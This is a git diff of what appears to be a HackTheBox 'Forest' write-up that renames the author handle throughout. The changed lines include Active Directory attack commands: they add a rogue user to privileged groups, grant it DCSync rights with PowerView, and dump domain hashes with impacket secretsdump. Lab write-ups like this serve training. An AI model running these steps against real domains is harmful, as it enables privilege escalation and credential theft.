@@ -1,12 +1,12 @@
 ---
-title: Forest HackTheBox writeup made by a dumb !!!
-author: dumbx90
+title: Forest HackTheBox writeup
+author: pwndumb
 date: 2019-12-12 14:10:00 +0800
 categories: [HTB, Writeup]
 tags: [htb,pentest,windows,activedirectory,easy,retired]
 ---
 
-![](https://github.com/dumbx90/dumbx90.github.io/blob/master/assets/img/commons/hackthebox/forest-description.png?raw=true)
+![](https://github.com/pwndumb/pwndumb.github.io/blob/master/assets/img/commons/hackthebox/forest-description.png?raw=true)
 
 <script id="asciicast-7qNiXMLBlH5xN0amZGTJ8bYWU" src="https://asciinema.org/a/7qNiXMLBlH5xN0amZGTJ8bYWU.js" async></script>
 
@@ -395,7 +395,7 @@ Invoke-Bloodhound -CollectionMethod All -LDAPPort 389 -LDAPUser svc-alfresco -LD
 
 Collect the file generate by sharphound and import in bloodhound. Lets analyze the informations to see if I  found the path to pwn the active directory:
 
-![](https://github.com/dumbx90/dumbx90.github.io/blob/master/assets/img/commons/forest-blodhound-path.jpg?raw=true)
+![](https://github.com/pwndumb/pwndumb.github.io/blob/master/assets/img/commons/forest-blodhound-path.jpg?raw=true)
 
 We see two important information:
 
@@ -405,11 +405,11 @@ We see two important information:
 Lest exploit both them:
 
 ```powershell
-*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user dumbx90 dumbwitheffort /add
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user pwndumb dumbwitheffort /add
 The command completed successfully.
-*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" dumbx90 /add
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" pwndumb /add
 The command completed successfully.
-*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" dumbx90 /add
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" pwndumb /add
 The command completed successfully.
 ```
 
@@ -420,19 +420,19 @@ Now Transfer the **Powerview.ps1** script to target machine:
 ```bash
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload PowerView.ps1
 Info: Uploading PowerView.ps1 to C:\Users\svc-alfresco\Documents\PowerView.ps1
-*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user dumbx90 dumbwitheffort /add /domain
-*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" dumbx90 /add
-*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" dumbx90 /add
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user pwndumb dumbwitheffort /add /domain
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" pwndumb /add
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" pwndumb /add
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $pass = convertto-securestring 'dumbwitheffort' -asplain -force
-*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $cred = New-Object System.Management.Automation.PSCredential("htb\dumbx90", $pass)
-*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectACL -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity dumbx90 -Rights DCSync
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $cred = New-Object System.Management.Automation.PSCredential("htb\pwndumb", $pass)
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectACL -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity pwndumb -Rights DCSync
 
 ```
 
 Now with the create user, lets dump the hashes of domain controller:
 
 ```bash
-dumbland () hgfs/hackthebox/forest :: /home/dumb/tools/impacket/examples/secretsdump.py htb.local/dumbx90:dumbwitheffort@10.10.10.161
+dumbland () hgfs/hackthebox/forest :: /home/dumb/tools/impacket/examples/secretsdump.py htb.local/pwndumb:dumbwitheffort@10.10.10.161
 Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
 
 [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
